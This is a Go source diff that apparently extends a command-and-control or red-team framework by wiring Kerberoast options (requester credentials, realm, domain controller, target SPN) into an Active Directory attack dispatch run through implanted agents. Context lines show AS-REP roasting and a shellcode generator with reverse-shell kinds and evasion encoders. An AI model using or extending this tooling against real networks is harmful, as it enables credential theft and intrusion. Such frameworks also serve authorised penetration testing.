@@ -171,6 +171,12 @@ func main() {
 	roastRealm := flag.String("roast-realm", "", "AS-REP roast: realm (e.g. CORP.LOCAL)")
 	roastDC := flag.String("roast-dc", "", "AS-REP roast: domain controller IP")
 	roastPort := flag.Int("roast-port", 88, "AS-REP roast: DC port")
+	kerbUser := flag.String("kerb-user", "", "Kerberoast: requester username")
+	kerbPass := flag.String("kerb-pass", "", "Kerberoast: requester password")
+	kerbRealm := flag.String("kerb-realm", "", "Kerberoast: realm")
+	kerbDC := flag.String("kerb-dc", "", "Kerberoast: DC IP")
+	kerbSPN := flag.String("kerb-spn", "", "Kerberoast: target SPN (Service/host)")
+	kerbPort := flag.Int("kerb-port", 88, "Kerberoast: DC port")
 	scArch := flag.String("shellcode-arch", "linux_x64", "shellcode target: linux_x64|linux_x86|windows_x64|macos_x64")
 	scKind := flag.String("shellcode-kind", "exec_sh", "shellcode kind: exec_sh|reverse_sh|exec_cmd")
 	scEncode := flag.String("shellcode-encode", "none", "encoder: none|xor|rot13|null_free|chunked_xor|base64|uuid|ipv4")
@@ -597,7 +603,7 @@ func main() {
 	}
 
 	// adenum dispatch — AD enumeration OR write via the first agent
-	if *adEnum != "" || *adWrite != "" || *roastUser != "" {
+	if *adEnum != "" || *adWrite != "" || *roastUser != "" || *kerbUser != "" {
 		go runAdEnumDispatch(mgr, adEnumArgs{
 			Action:      *adEnum,
 			Host:        *adHost,
@@ -621,6 +627,12 @@ func main() {
 			RoastRealm:  *roastRealm,
 			RoastDC:     *roastDC,
 			RoastPort:   *roastPort,
+			KerbUser:    *kerbUser,
+			KerbPass:    *kerbPass,
+			KerbRealm:   *kerbRealm,
+			KerbDC:      *kerbDC,
+			KerbSPN:     *kerbSPN,
+			KerbPort:    *kerbPort,
 		})
 	}
 
@@ -1643,6 +1655,12 @@ type adEnumArgs struct {
 	RoastRealm  string
 	RoastDC     string
 	RoastPort   int
+	KerbUser    string
+	KerbPass    string
+	KerbRealm   string
+	KerbDC      string
+	KerbSPN     string
+	KerbPort    int
 }
 
 // runAdEnumDispatch waits for the first agent, fires an AdEnumStart.
@@ -1684,6 +1702,12 @@ func runAdEnumDispatch(mgr *session.Manager, a adEnumArgs) {
 		RoastRealm:  a.RoastRealm,
 		RoastDC:     a.RoastDC,
 		RoastPort:   a.RoastPort,
+		KerbUser:    a.KerbUser,
+		KerbPass:    a.KerbPass,
+		KerbRealm:   a.KerbRealm,
+		KerbDC:      a.KerbDC,
+		KerbSPN:     a.KerbSPN,
+		KerbPort:    a.KerbPort,
 	}
 	if err := s.SendAdEnumStart(sessionID, req); err != nil {
 		log.Printf("[adenum] start: %v", err)
